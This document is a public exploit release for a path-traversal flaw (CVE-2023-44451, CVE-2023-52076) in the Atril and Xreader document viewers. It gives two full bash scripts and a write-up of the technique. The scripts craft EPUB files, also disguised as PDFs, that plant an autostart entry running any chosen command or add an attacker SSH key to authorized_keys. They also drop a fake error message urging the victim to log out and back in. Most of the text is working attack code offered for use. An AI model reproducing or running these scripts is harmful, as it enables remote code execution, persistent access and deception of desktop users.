
##
#
https://github.com/febinrev/slippy-book-exploit
#
##

```
#!/bin/bash


printf "
╔═╗┬  ┬┌─┐┌─┐┬ ┬   ╔╗ ┌─┐┌─┐┬┌─
╚═╗│  │├─┘├─┘└┬┘───╠╩╗│ ││ │├┴┐
╚═╝┴─┘┴┴  ┴   ┴    ╚═╝└─┘└─┘┴ ┴
 EPUB Path traversal Arbitrary File Write for Linux desktop environments (MATE)
                  -by Febin

[+] Affected Software components: Atril (default document viewer of MATE DE), Xreader (Default Doc Viewer of Mint OS)

[+] Affected OS: Kali Linux, Parrot Security OS, Ubuntu-mate, Linux Mint OS, Xubuntu and other OS with MATE or Atril/Xreader as default doc reader.

Note: This script will overwrite the specified EPUB document and also creates a .pdf file with the same name

"
epub=$1
content=$2
write_path=$3



write_epub(){




file "$epub" | grep "EPUB document" 2>/dev/null 1>/dev/null

if [[  ("$?" == "0") && (-w $content ) ]]
then

tmp_path="XXYXXYXXYXXYXXY"$(echo $write_path|tr "/" "Y")


cp "$content" "./$tmp_path"

trav_tmp_path=$(echo "$write_path"|tr "/" "Y"| awk '{gsub("Y", "\\/")};1')

#echo $trav_tmp_path

zip -u "$epub" "$tmp_path" >/dev/null

sed -i s/"${tmp_path}"/"..\/..\/..\/..\/..\/${trav_tmp_path}"/g "$epub"


cp "$epub" "${epub%.*}.pdf"

rm -f "$tmp_path" 

echo "[+] Files $epub ${epub%.*}.pdf written successfully"
else
echo "[-] Error! Specified file not found or the EPUB file specified is not an EPUB document"
exit

fi


}

usage(){

echo "
  .$0 <EPUB document> <File to write on target> <Full path to write on target>
  
  Example:
  
  $0 sample2.epub POC.txt /tmp/POC.txt
  
  $0 ~/Documents/ebook.epub \$HOME/file.txt /poc/self/cwd/Desktop/pwned.txt
  
  $0 ~/Documents/ebook.epub \$HOME/.ssh/id_rsa.pub /poc/self/cwd/.ssh/authorized_keys

"
}


if [[ (-z $epub) || (-z $content) || (-z $write_path) ]]
then
echo "[-] Arguments Required."
usage
else
write_epub
fi
```

Slippy-book: EPUB File Parsing Directory Traversal Remote Code Execution
CVE-2023-44451 (Xreader), CVE-2023-52076(Atril)(Reserved):
RCE Vulnerability affected popular Linux Distros including Mint, Kali, Parrot, Manjaro etc. EPUB File Parsing Directory Traversal Remote Code Execution

A Critical Path traversal and Arbitrary file write vulnerability has been discovered in the default document viewer software of Linux's MATE/ and Linux Mint affecting popular operating systems such as Kali Linux, Parrot Security OS, Ubuntu-Mate, Linux Mint, Xubuntu and all the other Operating Systems that use MATE or Atril/Xreader as default doc viewer.

The vulnerability exists in Atril Document Viewer and Xreader Document Viewer which are the default document viewers of the MATE environment and Linux Mint respectively. Atril is the default document reader for Kali Linux, Ubuntu-Mate, Parrot Security OS, and Xubuntu, and Xreader is the default document reader for Linux Mint.

This vulnerability is capable of writing arbitrary files anywhere on the filesystem to which the user opening a crafted document has access, the only limitation is that this vulnerability cannot be exploited to overwrite existing files but that doesn't stop an attacker from achieving Remote Command Execution on the target system.

[+] Achieving Remote Command Execution:
This vulnerability can't be exploited to overwrite existing files, it can only create new files under any specified locations, but that doesn't stop us from achieving RCE. I tried out using the vulnerability to write a .desktop entry under $HOME/.config/autostart and then I logged out and logged back in, the malicious .desktop entry got triggered and I got Remote Command Execution. I also tried placing an authorized_keys file under .ssh/ directory and achieved RCE via SSH. Note: If a directory is not present it will create the directory automatically.

Who knows about the Ebook format? Hasn't everyone switched to PDF?

The answer is no, EPUB is still a popular and powerful document format, but many people prefer PDF. Most of them are familiar with PDFs. So, I was trying to maximize this vulnerability impact. Another Interesting thing I noticed was, when renaming the .epub document to something.pdf, the vulnerable Document Viewer (Atril/Xreader) tries to open the something.pdf file and reads it as an EPUB document because it is responsible for reading both EPUB and PDF, it also supports many other document formats as well. In other words, we can rename our crafted something.epub to something.pdf and then send it to the target to achieve RCE on the target.

So everything is good, we could create an exploit that'll craft an epub/pdf pair to write malicious .desktop entries under /home//.config/autostart/ directory. But there's a small problem, the target user's username is required for successful exploitation of this bug. What if we don't know the username? No Easy RCE? Could you guess Username? Needs to try random common usernames? Let's see what I got..

Upon further analysis, I found out that we can use the /proc/self/cwd to access the user's home directory if he downloads the crafted document and opens it somewhere inside his home directory such as the ~/Downloads/, ~/Documents/ directory. So we can exploit the path traversal bug to achieve RCE just by using the gadget ../../../../../proc/self/cwd/../.config/autostart/exploit.desktop.

I have created a fully working exploit for this vulnerability (exploit_rce.sh) and a script to write and include custom files for path traversal (exploit_file_write.sh).

##
##


```
#!/bin/bash

####################################################################################
#                                                                                                                                                      #
#  This Exploit is still in development stage, it can be modified and tweaked to work more efficient   #
#  and more accurate.                                                                                                                       #
#                                                                                                                                                      #
####################################################################################
printf "
╔═╗┬  ┬┌─┐┌─┐┬ ┬   ╔╗ ┌─┐┌─┐┬┌─
╚═╗│  │├─┘├─┘└┬┘───╠╩╗│ ││ │├┴┐
╚═╝┴─┘┴┴  ┴   ┴    ╚═╝└─┘└─┘┴ ┴
 0-day RCE Exploit for Linux desktop environments (MATE, Cinnamon, UKUI)
                  -by Febin (@febin_nj)

[+] Affected Software components: Atril (default document viewer of MATE DE), Xreader (Default Doc Viewer of Cinnamon DE, Mint OS)

[+] Affected OS: Linux Mint, Kali Linux, Parrot Security OS, Ubuntu-mate, Xubuntu, Ubuntu Kylin(Official chinese variant of Ubuntu ), KylinOS V10 (Chinese OS) and other OS with MATE, Cinnamon DE, Kylin DE or Atril/Xreader as default doc reader.


"
rm -rf ./XXYXXYXXYXXYXXY*

write_ssh(){


ssh-keygen -t rsa -P '' -f ./slippy_rsa


cp ./slippy_rsa.pub XXYXXYXXYXXYXXYprocYselfYcwdY.sshYauthorized_keys
cp ./slippy_rsa.pub XXYXXYXXYXXYXXYprocYselfYcwdY.ssh2Yauthorized_keys
cp ./slippy_rsa.pub XXYXXYXXYXXYXXYprocYselfYcwdYXXY.sshYauthorized_keys
cp ./slippy_rsa.pub XXYXXYXXYXXYXXYprocYselfYcwdYXXY.ssh2Yauthorized_keys

cp ./slippy_rsa.pub XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXY.sshYauthorized_keys
cp ./slippy_rsa.pub XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXY.ssh2Yauthorized_keys

cp ./slippy_rsa.pub XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXYXXY.sshYauthorized_keys
cp ./slippy_rsa.pub XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXYXXY.ssh2Yauthorized_keys

cp ./slippy_rsa.pub XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXYXXYXXY.sshYauthorized_keys
cp ./slippy_rsa.pub XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXYXXYXXY.ssh2Yauthorized_keys


zip -u "$tmpfile" XXYXXYXXYXXYXXYprocYselfYcwdY.sshYauthorized_keys XXYXXYXXYXXYXXYprocYselfYcwdY.ssh2Yauthorized_keys XXYXXYXXYXXYXXYprocYselfYcwdYXXY.sshYauthorized_keys XXYXXYXXYXXYXXYprocYselfYcwdYXXY.ssh2Yauthorized_keys  XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXY.sshYauthorized_keys  XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXY.ssh2Yauthorized_keys  XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXYXXY.sshYauthorized_keys  XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXYXXY.ssh2Yauthorized_keys  XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXYXXYXXY.sshYauthorized_keys  >/dev/null

sed -i s/"XXYXXYXXYXXYXXYprocYselfYcwdY.sshYauthorized_keys"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/.ssh\/authorized_keys"/g "$tmpfile"
sed -i s/"XXYXXYXXYXXYXXYprocYselfYcwdYXXY.sshYauthorized_keys"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/..\/.ssh\/authorized_keys"/g "$tmpfile"

sed -i s/"XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXY.sshYauthorized_keys"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/..\/..\/.ssh\/authorized_keys"/g "$tmpfile"
sed -i s/"XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXYXXY.sshYauthorized_keys"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/..\/..\/..\/.ssh\/authorized_keys"/g "$tmpfile"
sed -i s/"XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXYXXYXXY.sshYauthorized_keys"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/..\/..\/..\/..\/.ssh\/authorized_keys"/g "$tmpfile"

sed -i s/"XXYXXYXXYXXYXXYprocYselfYcwdY.ssh2Yauthorized_keys"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/.ssh2\/authorized_keys"/g "$tmpfile"
sed -i s/"XXYXXYXXYXXYXXYprocYselfYcwdYXXY.ssh2Yauthorized_keys"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/..\/.ssh2\/authorized_keys"/g "$tmpfile"

sed -i s/"XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXY.ssh2Yauthorized_keys"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/..\/..\/.ssh2\/authorized_keys"/g "$tmpfile"
sed -i s/"XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXYXXY.ssh2Yauthorized_keys"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/..\/..\/..\/.ssh2\/authorized_keys"/g "$tmpfile"
sed -i s/"XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXYXXYXXY.ssh2Yauthorized_keys"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/..\/..\/..\/..\/.ssh2\/authorized_keys"/g "$tmpfile"

epub="${epub%.*}.epub"
mkdir output 2> /dev/null
cp "$tmpfile" output/"$epub"
cp "$tmpfile" output/"${epub%.*}.pdf"
rm -rf "$tmpfile"
echo "

[+] Files $epub and ${epub%.*}.pdf written to output/ directory!
"
}

write_autostart(){

printf "[>] Enter the Payload/Command to execute on the target: "
read CMD
autostart_app="desktop-login${RANDOM}.desktop"
tmp_autostart="XXYXXYXXYXXYXXYprocYselfYcwdY.configYautostartY${autostart_app}"
tmp_autostart2="XXYXXYXXYXXYXXYprocYselfYcwdYXXY.configYautostartY${autostart_app}"
tmp_autostart3="XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXY.configYautostartY${autostart_app}"
tmp_autostart4="XXYXXYXXYXXYXXYprocYselfYcwdYXXYXXYXXY.configYautostartY${autostart_app}"

echo "[Desktop Entry]
Encoding=UTF-8
Version=1.0
Type=Application
Terminal=false
Exec=bash -c \"$CMD\"
Name=Desktop Service
" > "$tmp_autostart"

echo "[Desktop Entry]
Encoding=UTF-8
Version=1.0
Type=Application
Terminal=false
Exec=bash -c \"$CMD\"
Name=Desktop Service
" > "$tmp_autostart2"

echo "[Desktop Entry]
Encoding=UTF-8
Version=1.0
Type=Application
Terminal=false
Exec=bash -c \"$CMD\"
Name=Desktop Service
" > "$tmp_autostart3"

echo "[Desktop Entry]
Encoding=UTF-8
Version=1.0
Type=Application
Terminal=false
Exec=bash -c \"$CMD\"
Name=Desktop Service
" > "$tmp_autostart4"



chmod 777 $tmp_autostart

zip -u "$tmpfile" $tmp_autostart $tmp_autostart2 $tmp_autostart3 $tmp_autostart4 >/dev/null

sed -i s/"$tmp_autostart"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/.config\/autostart\/$autostart_app"/g "$tmpfile"
sed -i s/"$tmp_autostart2"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/..\/.config\/autostart\/$autostart_app"/g "$tmpfile"
sed -i s/"$tmp_autostart3"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/..\/..\/.config\/autostart\/$autostart_app"/g "$tmpfile"
sed -i s/"$tmp_autostart4"/"..\/..\/..\/..\/..\/proc\/self\/cwd\/..\/..\/..\/.config\/autostart\/$autostart_app"/g "$tmpfile"

epub="${epub%.*}.epub"
mkdir output 2>/dev/null
cp "$tmpfile" output/"$epub"
cp "$tmpfile" output/"${epub%.*}.pdf"
rm -rf "$tmpfile"
echo "

[+] Files $epub and ${epub%.*}.pdf written to output/ directory!
"
}

mainprogram(){
file $epub_path | grep "EPUB document" >/dev/null
  
if [ "$?" -eq "0" ]
then
     epub=$(basename $epub_path)
     rand=$RANDOM
     tmpfile="$rand"_"$epub"
     cp "$epub_path" ./"$tmpfile"
     
     fake_error="XXYXXYXXYXXYXXYtmpYerror-${RANDOM}.log"
     
     echo "Error opening the document! 
Logging off and logging back in might fix the issue" > $fake_error
     zip -u "$tmpfile" "$fake_error" >/dev/null
     sed -i s/"XXYXXYXXYXXYXXYtmpY"/"..\/..\/..\/..\/..\/tmp\/"/g "$tmpfile"
     rm -f "$fake_error"
     
     echo " [1] Write an autostart app in the victim machine(Efficient, Payload will be triggered when user logs out and logs back in) [Default]"
     echo " [2] Write authorized_keys file on the target machine. (Needs SSH enabled on the target)"
     printf "\n    [>] Enter your choice [Default: 1]: "
     
     read choice
     if [ "$choice" == "1" ]
     then
     write_autostart
     elif [ "$choice" == "2" ]
     then
     write_ssh
     else
     echo "[-] Inavlid Choice! Going with the default option [1] "
     write_autostart
     fi

else
     echo "[-] Error: Specified File is not an EPUB document."
     exit
fi

rm -rf $tmpfile 
}

printf "[>] Epub document location [Default: sample1.epub]: "
read epub_path
epub_path=${epub_path:-./sample1.epub}
if [ -e $epub_path ]
then
  mainprogram
  rm -rf ./XXYXXYXXYXXYXXY*
else
 echo "[-] Error: Specified File does not exists."
 exit
fi
rm -rf ./XXYXXYXXYXXYXXY*
```


